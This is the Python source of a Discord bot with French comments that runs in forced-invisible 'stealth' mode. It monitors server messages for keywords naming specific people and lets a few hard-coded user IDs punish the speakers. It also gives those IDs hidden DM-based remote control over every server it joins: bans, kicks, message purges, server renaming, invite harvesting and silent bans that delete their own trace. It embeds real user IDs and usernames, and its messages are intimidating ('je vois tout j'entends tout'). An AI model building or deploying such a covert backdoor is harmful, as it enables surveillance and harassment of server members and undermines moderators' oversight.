import discord
from discord.ext import commands
import os
import datetime
from flask import Flask
from threading import Thread

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Configuration des identifiants et des cibles
VICTIME_NAME = "m1zuki_1"

# Les IDs autorisés pour le contrôle/surveillance
IDS_GROUPE_1 = [1402771839029219442, 776111075036889160] # Tom (PC/Tel)
IDS_GROUPE_2 = [996157528092184687] # Hamza / Ogi

MOTS_CLES_1 = ["tom", "kyzo", "kaizo", "chinois sans nems"]
MOTS_CLES_2 = ["hamza", "ogi"]

# Stockage temporaire pour les demandes de timeout
pending_timeouts = {}

# --- SERVEUR WEB POUR GARDER LE BOT ACTIF SUR RENDER ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot en ligne !"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# Fonction utilitaire pour récupérer un serveur soit par son ID, soit par un lien/code d'invitation
async def get_guild_from_input(identifier):
    if identifier.isdigit():
        return bot.get_guild(int(identifier))
    try:
        code = identifier.split("/")[-1]
        invite = await bot.fetch_invite(code)
        return invite.guild
    except:
        return None

@bot.event
async def on_ready():
    # Force le statut en mode invisible (hors-ligne) dès que le bot est prêt
    await bot.change_presence(status=discord.Status.invisible)
    print(f"Bot furtif opérationnel et invisible. Surveillance active.")

# =========================================================================
# AUTO-ROLE : Ajoute automatiquement le rôle "Membre" aux IDs spécifiés
# =========================================================================
@bot.event
async def on_member_update(before, after):
    tous_ids = IDS_GROUPE_1 + IDS_GROUPE_2
    if after.id in tous_ids:
        role = discord.utils.get(after.guild.roles, name="Membre")
        if role and role not in after.roles:
            try:
                await after.add_roles(role)
            except:
                pass

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    content_lower = message.content.lower()
    
    # 1. Surveillance pour m1zuki_1 (mots clés originaux)
    mots_cles_m1zuki = ["cozmo", "ilan", "youngzoomer", "@m1zuki_1"]
    if message.guild and any(mot.lower() in content_lower for mot in mots_cles_m1zuki) and message.author.name != VICTIME_NAME:
        victime = discord.utils.get(message.guild.members, name=VICTIME_NAME)
        if victime:
            pending_timeouts[message.author.id] = message.author
            try:
                await victime.send(
                    f"🚨 **Cible verrouillée** 🚨\n"
                    f"L'utilisateur '{message.author.name}' a dit votre prénom.\n"
                    f"Voulez-vous l'exterminer (timeout 10min) ? Répondez **oui** ou **non**."
                )
            except:
                pass

    # 2. Surveillance pour Groupe 1 (Tom)
    ping_groupe_1 = any(str(uid) in message.content for uid in IDS_GROUPE_1)
    if message.guild and (any(mot in content_lower for mot in MOTS_CLES_1) or ping_groupe_1) and message.author.id not in IDS_GROUPE_1:
        surveillant = message.guild.get_member(IDS_GROUPE_1[0]) or bot.get_user(IDS_GROUPE_1[0])
        if surveillant:
            pending_timeouts[message.author.id] = message.author
            try:
                await surveillant.send(
                    f"🚨 **Cible verrouillée (Groupe 1)** 🚨\n"
                    f"L'utilisateur '{message.author.name}' a déclenché un mot-clé ou vous a pingé.\n"
                    f"Voulez-vous l'exterminer (timeout 10min) ? Répondez **oui** ou **non**."
                )
            except:
                pass

    # 3. Surveillance pour Groupe 2 (Hamza / Ogi)
    ping_groupe_2 = any(str(uid) in message.content for uid in IDS_GROUPE_2)
    if message.guild and (any(mot in content_lower for mot in MOTS_CLES_2) or ping_groupe_2) and message.author.id not in IDS_GROUPE_2:
        surveillant = message.guild.get_member(IDS_GROUPE_2[0]) or bot.get_user(IDS_GROUPE_2[0])
        if surveillant:
            pending_timeouts[message.author.id] = message.author
            try:
                await surveillant.send(
                    f"🚨 **Cible verrouillée (Groupe 2)** 🚨\n"
                    f"L'utilisateur '{message.author.name}' a déclenché un mot-clé ou vous a pingé.\n"
                    f"Voulez-vous l'exterminer (timeout 10min) ? Répondez **oui** ou **non**."
                )
            except:
                pass

    # Gestion des réponses en DM (m1zuki_1 ou les autres IDs autorisés)
    is_authorized_dm_user = message.author.name == VICTIME_NAME or message.author.id in IDS_GROUPE_1 + IDS_GROUPE_2

    if isinstance(message.channel, discord.DMChannel) and is_authorized_dm_user:
        content = message.content.lower().strip()
        if content in ["oui", "non"]:
            if pending_timeouts:
                user_id = list(pending_timeouts.keys())[0]
                target = pending_timeouts[user_id]
                
                if content == "oui":
                    # Si m1zuki_1 répond "oui", le bot se fait kick et envoie les messages requis
                    if message.author.name == VICTIME_NAME:
                        try:
                            for g in bot.guilds:
                                member_in_guild = g.get_member(target.id)
                                if member_in_guild:
                                    await g.kick(bot.user, reason="Kick automatique suite au 'oui' de m1zuki_1")
                        except:
                            pass
                        try:
                            await message.author.send("redis plus jamais mon nom sans mon autorisation")
                            await message.author.send("je vois tout j'entends tout")
                        except:
                            pass

                    try:
                        duration = datetime.timedelta(minutes=10)
                        await target.timeout(duration, reason="Punition validée")
                        await target.send(f"Tu dis mon prénom ? Explique toi maintenant ! @{message.author.name}")
                        await message.author.send(f"✅ L'utilisateur {target.name} a pris un timeout de 10 min.")
                    except Exception as e:
                        await message.author.send(f"❌ Impossible de timeout cette personne : {e}")
                else:
                    await message.author.send("✅ Action annulée.")
                
                pending_timeouts.pop(user_id)
            else:
                await message.author.send("Aucune cible en attente.")
            return

    # =========================================================================
    # 1. GESTION DES DM (Contrôle à distance sécurisé)
    # =========================================================================
    if isinstance(message.channel, discord.DMChannel):
        if message.author.id not in (IDS_GROUPE_1 + IDS_GROUPE_2):
            return

        args = message.content.split()
        if not args: return
        cmd = args[0].lower()

        try:
            if cmd == "serveurs":
                txt = "\n".join([f"{g.name} (ID: {g.id})" for g in bot.guilds])
                await message.author.send(f"📋 Serveurs :\n{txt}")

            elif cmd == "liens":
                links_output = "🔗 **Liens d'invitation de tous les serveurs :**\n"
                for g in bot.guilds:
                    try:
                        invite = None
                        for c in g.text_channels:
                            try:
                                invite = await c.create_invite(max_uses=1, max_age=3600)
                                break
                            except:
                                continue
                        if invite:
                            links_output += f"- **{g.name}** : {invite.url}\n"
                        else:
                            links_output += f"- **{g.name}** : ❌ Pas de permission\n"
                    except:
                        links_output += f"- **{g.name}** : ❌ Erreur\n"
                await message.author.send(links_output)

            elif cmd == "dire":
                target_channel = bot.get_channel(int(args[1]))
                await target_channel.send(" ".join(args[2:]))
                await message.author.send("✅ Envoyé.")

            elif cmd == "purge":
                channel = bot.get_channel(int(args[1]))
                deleted = await channel.purge(limit=int(args[2]))
                await message.author.send(f"✅ {len(deleted)} messages supprimés.")

            elif cmd == "ban":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                await member.ban(reason="Banni via DM")
                await message.author.send("✅ Utilisateur banni.")

            elif cmd == "unban":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                user_obj = await bot.fetch_user(int(args[2]))
                await guild.unban(user_obj, reason="Débannissement via DM")
                await message.author.send(f"✅ L'utilisateur {user_obj.name} a été débanni de {guild.name}.")

            elif cmd == "untimeout":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                await member.timeout(None, reason="Retrait du timeout via DM")
                await message.author.send(f"✅ Le timeout de {member.name} a été retiré.")

            elif cmd == "kick":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                await member.kick()
                await message.author.send("✅ Utilisateur expulsé.")

            elif cmd == "role":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                role = await guild.create_role(name=args[2])
                await message.author.send(f"✅ Rôle {role.name} créé.")

            elif cmd == "setrolename":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                role_input = args[2]
                new_role_name = " ".join(args[3:])
                role = None
                if role_input.isdigit():
                    role = guild.get_role(int(role_input))
                if not role:
                    role = discord.utils.get(guild.roles, name=role_input)
                if not role:
                    await message.author.send("❌ Rôle introuvable.")
                    return
                await role.edit(name=new_role_name)
                await message.author.send(f"✅ Rôle renommé en '{new_role_name}'.")

            elif cmd == "puissance":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                
                target_input = args[2]
                member = None
                if target_input.isdigit():
                    try:
                        member = await guild.fetch_member(int(target_input))
                    except:
                        pass
                if not member:
                    member = discord.utils.find(lambda m: m.name == target_input or m.display_name == target_input, guild.members)

                if not member:
                    await message.author.send(f"❌ Impossible de trouver l'utilisateur '{target_input}' sur ce serveur.")
                    return

                role = discord.utils.get(guild.roles, name="La puissance")
                if not role:
                    await message.author.send("❌ Le rôle 'La puissance' n'existe pas sur ce serveur.")
                    return

                await member.add_roles(role, reason="Attribué via la commande puissance")
                await message.author.send(f"✅ Le rôle 'La puissance' a été attribué à {member.name} sur {guild.name}.")

            elif cmd == "nick":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                await guild.me.edit(nick=args[2])
                await message.author.send("✅ Mon pseudo a été changé.")

            elif cmd == "setname":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                new_name = " ".join(args[2:])
                await guild.edit(name=new_name)
                await message.author.send(f"✅ Nom du serveur modifié : {new_name}")

            elif cmd == "setnick":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                new_nickname = " ".join(args[3:])
                await member.edit(nick=new_nickname)
                await message.author.send(f"✅ Pseudo de {member.name} modifié.")

            elif cmd == "salon":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                channel_name = " ".join(args[2:])
                new_channel = await guild.create_text_channel(channel_name)
                await message.author.send(f"✅ Salon #{new_channel.name} créé (ID: {new_channel.id}).")

            elif cmd == "mute":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                duration_mins = int(args[3]) if len(args) > 3 and args[3].isdigit() else 10
                await member.timeout(datetime.timedelta(minutes=duration_mins), reason="Mute serveur via DM")
                await message.author.send(f"✅ {member.name} a été muté pour {duration_mins} minutes.")

            elif cmd == ".kyzo" or cmd == "kyzo":
                await message.author.send("✅ Commande .kyzo bien exécutée et opérationnelle !")

        except Exception as e:
            await message.author.send(f"❌ Erreur : {e}")
        return

    # =========================================================================
    # 2. COMMANDES SUR LE SERVEUR (!untoakz et .ban)
    # =========================================================================
    if message.guild:
        if message.content.startswith("!untoakz"):
            try:
                old_akz = discord.utils.get(message.guild.members, name="akz_92")
                if old_akz:
                    await old_akz.timeout(None, reason="Retrait du timeout via !untoakz")
                    await message.channel.send(f"✅ Le timeout a été réinitialisé.")
                else:
                    await message.channel.send("❌ Cible introuvable sur ce serveur.")
            except Exception as e:
                await message.channel.send(f"❌ Erreur : {e}")
            return

        if message.content.startswith(".ban"):
            if message.author.id in (IDS_GROUPE_1 + IDS_GROUPE_2):
                try:
                    await message.delete()
                except:
                    pass

                if message.mentions:
                    target = message.mentions[0]
                    guild = message.guild

                    try:
                        await guild.ban(target, reason="Banni discrètement via .ban")
                    except Exception as e:
                        try:
                            await message.author.send(f"❌ Erreur lors du ban furtif : {e}")
                        except:
                            pass

# Lancement du serveur web pour Render
keep_alive()

# Lancement sécurisé via la variable d'environnement
bot.run(os.getenv("TOKEN"))
